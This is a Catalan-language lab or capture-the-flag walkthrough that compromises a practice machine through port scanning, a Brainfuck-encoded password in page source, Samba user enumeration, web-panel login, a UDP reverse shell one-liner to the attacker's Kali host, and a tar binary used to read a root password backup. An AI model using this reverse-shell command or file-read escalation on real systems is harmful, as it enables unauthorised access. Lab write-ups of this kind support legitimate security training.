Els ports oberts de la víctima són els següents:

![image](https://github.com/user-attachments/assets/30a153d1-6617-4aa4-82c0-3e72016c9551)

Una captura de pantalla de cada un dels tres URLs que hi ha.

http://192.168.1.77:20000/ si anem a l’https tenim una pàgina de login.

![image](https://github.com/user-attachments/assets/79829180-fbe4-457d-ba41-3d0c76f3254b)

![image](https://github.com/user-attachments/assets/bb183973-dd32-4143-a334-fbd834266e06)


El mateix amb la del port 10000:

![image](https://github.com/user-attachments/assets/a54fa588-d23a-4f53-aa96-3da0fc2f9c83)

![image](https://github.com/user-attachments/assets/e3f16b70-5f64-42a5-8da9-ea048541fe81)


http://192.168.1.57:80 

![image](https://github.com/user-attachments/assets/bfb5cd7a-b6fa-4c24-8c2a-bfebc677a179)


A més a més he trobat multitud de directoris:

![image](https://github.com/user-attachments/assets/15317a88-2bf0-4116-8dfb-6fb6a4cda3b9)


A la web del port 80 hi ha una contrasenya codificada. Per descodificar-la ens anirà bé la
web “brainfuck”

Mirant el codi font de la pàgina /index.html he trobat això:

![image](https://github.com/user-attachments/assets/4535f924-94b2-4449-ab95-889ad434c6d9)


Ara ho descodificaré amb brainfuck:

![image](https://github.com/user-attachments/assets/7c69beaf-38c3-4356-99da-e9230ae74376)

Hi ha la següent password: ``.2uqPEfj3D<P'a-3``

Ara ja tenim la contrasenya, ens falta l'usuari. Revisem el resultat de l’nmap que hem fet
inicialment, veiem que té els ports 139 i 145 oberts amb el servei Samba escoltant. Hi
ha l’eina enum4linux per enumerar informació d’aquest servei. 

L’usuari que he trobat és el següent:

![image](https://github.com/user-attachments/assets/a7c788d4-f85a-4631-b614-8822a589574b)

![image](https://github.com/user-attachments/assets/58624d4b-7ebd-4013-abc4-78ca037c8314)



Un cop tenim l’usuari, fem un login:

He trobat que al port 20000 que és un dels que he provat dels trobats a nmap puc fer el login amb l’usuari i la contrasenya que he trobat:

![image](https://github.com/user-attachments/assets/e6014c79-9773-4fb6-b0fe-58feeb97998e)

![image](https://github.com/user-attachments/assets/0b2b8edc-f2fa-4b1f-a7ba-894188d2ed0d)


En aquesta interfície d’usuari cerquem un terminal de consola (n’hi ha més d’un) i el posem en
marxa, així serem l'usuari cyber:

L’usuari cyber:

![image](https://github.com/user-attachments/assets/3c6a5548-d709-4ab6-820d-93d2254eb773)

Escalada de privilegis:

Executem una shell inversa cap a la nostra màquina Kali. Amb la comanda:

La comanda següent: ``sh -i >& /dev/udp/192.168.1.67/4444 0>&1``

![image](https://github.com/user-attachments/assets/498c79d8-daa4-4bf8-ac1c-5aa2cd93b4fc)


Després de cercar pels directoris de la màquina víctima, hem trobat dues coses potencialment interessants:

● El fitxer /home/…../tar
■ Qui té permisos per executar-lo?

El propietari té permisos d’execució (x).
El grup té permisos d’xecució (x)
Altres usuaris també tenen permisos d’execució (x)

Això significa que el propietari (que és l'usuari "root" en aquest cas) té permisos complets (lectura, escriptura i execució), mentre que el grup i altres usuaris tenen permisos només per llegir i executar el fitxer.

![image](https://github.com/user-attachments/assets/a027e3c3-4a61-4ba2-aef3-a74664215b6f)

● El directori /var/backups
■ Quin fitxer hi ha dins? Qui hi té permisos de lectura i escriptura?

Els fitxers següents:

apt.extended_states.0
.old_pass.bak

![image](https://github.com/user-attachments/assets/b7f53c47-958a-45b8-8ed0-535e353fc9c5)

-"apt.extended_states.0": Té permisos de lectura per a tots els usuaris (propetari, grup i altres), però no té permisos d'escriptura per a ningú excepte el propietari.

-".old_pass.bak": Només el propietari té permisos de lectura i escriptura. El propietari té permisos de lectura i escriptura, mentre que ni el grup ni altres usuaris tenen cap permís.

Ara utilitzem l’eina tar del directori /home/…… per obtenir el contingut del fitxer .old_pass.bak
Quina contrasenya conté?

Executo la següent comanda: ``./tar -cf old_pass /var/backups/.old_pass.bak``

![image](https://github.com/user-attachments/assets/67dc8e44-8b44-4ab5-9e42-412ba6cffe58)

![image](https://github.com/user-attachments/assets/6c914c36-5647-4527-b93c-6f94dbbec6c6)


La contrasenya: ``Ts&4&YurgtRX(=~h``

I ara amb això escalem a root.Per mostra una captura de pantalla dient quin usuari som.

Ara executem la comanda su root ja que sudo su no va, posem la contrasenya que hem trobat i ja som root:

![image](https://github.com/user-attachments/assets/3565cea2-3ed0-4ec1-aaeb-5028705cdf28)

